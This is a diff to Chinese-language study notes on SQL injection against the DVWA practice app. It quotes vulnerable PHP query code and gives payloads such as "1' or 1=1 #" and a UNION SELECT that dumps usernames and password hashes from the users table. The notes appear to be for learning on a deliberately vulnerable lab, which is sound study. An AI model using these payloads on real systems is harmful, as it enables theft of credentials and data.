@@ -59,7 +59,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 ```
 
-> 没有做任何过滤,查询两列，所以sql语句也只能查两个。
+> 没有做任何过滤,查询两列，所以sql语句也只能查两个。 `'`单引号，字符型注入。
 
 
 
@@ -129,7 +129,7 @@ if( isset( $_POST[ 'Submit' ] ) ) {
 
 ```
 
-> `mysqli_real_escape_string`转义特殊字符
+> `mysqli_real_escape_string`转义特殊字符 $id 没有引号，数字型注入。
 
 > burp抓包，该包，用sql注入思路获取数据。
 
@@ -139,5 +139,37 @@ id=1 or 1=1
 
 2. 获取数据
 id=1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(user,password) from users #&Submit=Submit
+```
+
+
+
+
+
+### 3. high
+
+> 高级
+>
+> 代码
+
+```php
+<?php
+
+if( isset( $_SESSION [ 'id' ] ) ) {
+    // Get input
+    $id = $_SESSION[ 'id' ];
+
+    // Check database
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );
+
+```
+
+> 多了`LIMIT 1`只查询一行数据。
+
+```shell
+# #  注释后面的就行
+1' or 1=1 #
+
+id=1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(user,password) from users #
 ```
 
